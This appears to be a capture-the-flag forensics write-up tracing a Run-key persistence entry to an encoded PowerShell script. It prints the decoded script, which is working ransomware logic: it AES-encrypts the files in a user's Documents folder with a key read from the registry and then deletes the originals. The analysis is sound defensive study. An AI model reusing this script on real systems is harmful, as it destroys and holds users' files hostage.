## Unsolved

The format of given file is AD1 so we need to check it with FTK Imager.

![image](https://github.com/user-attachments/assets/2106c011-7c08-4a26-83fa-5607aa1864de)

There is non-default user **sand-4ECC834FCF** so I tried to analyze it.
In description '.. when he installs something suddenly his device reboots and his files suddenly disappear .. ', we can assume the ransomware need to reboot/login for got executed. In windows you can set what device will do everytime user got login in Registry Key. 

I used Registry Explorer tool to check on registry HCKU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run for malicious entry via NTUSER.DAT

![image](https://github.com/user-attachments/assets/6c1ba36e-b037-41ca-b6dc-cfc2b13853db)

We can know that there is file named **console.bat** was executed. The content of that file is encoded powershell code.

![image](https://github.com/user-attachments/assets/ffd3caf0-fc14-454c-b14d-28582ce9bf3c)

I used powerdecode tool to decode and deobfuscate it and this is the result.

```poweshell
function Encrypt-File {
    param (
        [string]$sourceFilePath,
        [string]$destFilePath,
        [string]$encryptionKey,
        [string]$initVector
    )
    
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($encryptionKey)
    $ivBytes = [System.Text.Encoding]::UTF8.GetBytes($initVector)

    # Validate key length (must be 16, 24, or 32 bytes)
    if ($keyBytes.Length -ne 16 -and $keyBytes.Length -ne 24 -and $keyBytes.Length -ne 32) {
        throw "ERROR"
    }
    
    # Validate IV length (must be 16 bytes)
    if ($ivBytes.Length -ne 16) {
        throw "ERROR"
    }

    $aes = New-Object "System.Security.Cryptography.AesManaged"
    $aes.Key = $keyBytes
    $aes.IV = $ivBytes
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $fileContent = [System.IO.File]::ReadAllBytes($sourceFilePath)
    $encryptor = $aes.CreateEncryptor()
    $encryptedContent = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)

    # Combine IV and encrypted content
    [byte[]] $finalContent = $aes.IV + $encryptedContent
    $aes.Dispose()

    Write-Output $destFilePath
    $result = [System.IO.File]::WriteAllBytes($destFilePath, $finalContent)
    Write-Output "done"
    Remove-Item -Path $sourceFilePath
}

# Main script
$userDocuments = "C:\Users\" + $Env:UserName + "\Documents"
$sourcePath = $userDocuments
$encryptedFilesPath = "C:\Users\" + $Env:UserName + "\AppData\Local\Microsoft\Garage"

# Create directory for encrypted files
try {
    New-Item -Path $encryptedFilesPath -ItemType Directory -ErrorAction Stop
} catch [System.IO.IOException] {
    "Already Exist!"
}

# Registry path where encryption keys are stored
$registryPath = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\02e7a9afbb77"
$encryptionKey = (Get-ItemProperty -Path $registryPath -Name "59e2beee1b06")."59e2beee1b06"
$initVector = (Get-ItemProperty -Path $registryPath -Name "076a2843f321")."076a2843f321"

Write-Output $encryptionKey

if (-not (Test-Path -Path $registryPath)) {
    New-Item -ItemType Directory -Path $registryPath
}

# Get all files in the Documents folder
$files = Get-ChildItem -Path $sourcePath -File

# Encrypt each file
foreach ($file in $files) {
    $sourceFile = $file.FullName
    $destFile = Join-Path -Path $encryptedFilesPath -ChildPath $file.Name
    Encrypt-File $sourceFile $destFile $encryptionKey $initVector
}

Write-Output "dones"
```

